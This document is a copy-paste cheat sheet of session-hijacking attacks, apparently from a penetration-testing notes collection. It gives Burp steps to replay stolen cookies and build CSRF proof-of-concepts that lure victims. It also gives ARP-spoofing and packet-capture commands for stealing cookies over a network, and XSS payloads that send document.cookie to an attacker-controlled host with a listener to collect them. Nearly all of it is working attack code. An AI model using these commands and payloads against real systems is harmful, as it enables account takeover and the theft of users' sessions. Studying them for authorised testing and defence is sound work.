# 10 Session Hijacking — copy-paste commands

## Burp — set up the proxy (the first 30 seconds)

```
1. Burp → Proxy → Options → listen on 127.0.0.1:8080
2. Firefox → Settings → Network → Manual Proxy 127.0.0.1:8080 (HTTP + HTTPS)
3. Install Burp CA: http://burp  → "CA Certificate" → import in Firefox
4. Proxy → Intercept is ON → browse the target
5. Right-click a request → Send to Repeater
```

## Burp Repeater — replay with a stolen cookie

```
1. Send the logged-out "/dashboard" request to Repeater
2. Replace Cookie: header with the stolen value:
     Cookie: SESSIONID=abc123def456
3. Click Send
4. Look at response body — if it's the victim's dashboard, hijack worked.
```

## Burp — generate a CSRF PoC

```
1. In Proxy History, find a state-changing POST
   (e.g. POST /change_email  body=email=new@x.com)
2. Right-click → Engagement tools → Generate CSRF PoC
3. Copy the HTML, host it:
      python3 -m http.server 80
4. Lure victim. When they visit, browser auto-sends their cookie,
   and the action fires as them.
```

## Capture cookies via MITM

```bash
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. ARP spoof (see 07-sniffing)
sudo arpspoof -i eth0 -t <VICTIM> <GW>
sudo arpspoof -i eth0 -t <GW> <VICTIM>

# 3. Capture only traffic with cookies
sudo tcpdump -i eth0 -w cookies.pcap 'tcp port 80'

# 4. Extract cookies from the pcap
tshark -r cookies.pcap -Y "http.cookie" -T fields -e http.host -e http.cookie
```

Or with bettercap (one-shot):
```
> set arp.spoof.targets <VICTIM>
> arp.spoof on
> net.sniff on
```
Bettercap prints HTTP cookies live in the console.

→ See [ettercap.md](../tools/ettercap.md), [bettercap.md](../tools/bettercap.md)

## Wireshark — pull the cookie

```
Display filter:   http.cookie
Or:               http.cookie contains "PHPSESSID"
Right-click packet → Copy → Value
```

## XSS cookie stealer payloads

```html
<!-- Basic reflective -->
<script>fetch('http://<LHOST>/?c='+document.cookie)</script>

<!-- Image beacon (works even if JS fetch is blocked) -->
<script>new Image().src='http://<LHOST>/?c='+document.cookie</script>

<!-- Inside an attribute -->
" onmouseover="fetch('http://<LHOST>/?c='+document.cookie)

<!-- When HTTPOnly is set, you cannot read document.cookie — pivot to keylog/CSRF instead -->
```

Catch on attacker:
```bash
python3 -m http.server 80
# Victim's cookie appears in access log as  GET /?c=SESSIONID=abc123
```

## Replay cookie with curl (no Burp)

```bash
curl -v -b "SESSIONID=abc123def456" http://<TARGET>/dashboard
```

## Inject a stolen cookie in Firefox

```
F12 → Storage → Cookies → <site>
Right-click → Add → Name: SESSIONID   Value: abc123def456
Refresh page
```

Or use the **Cookie-Editor** / **EditThisCookie** extension.
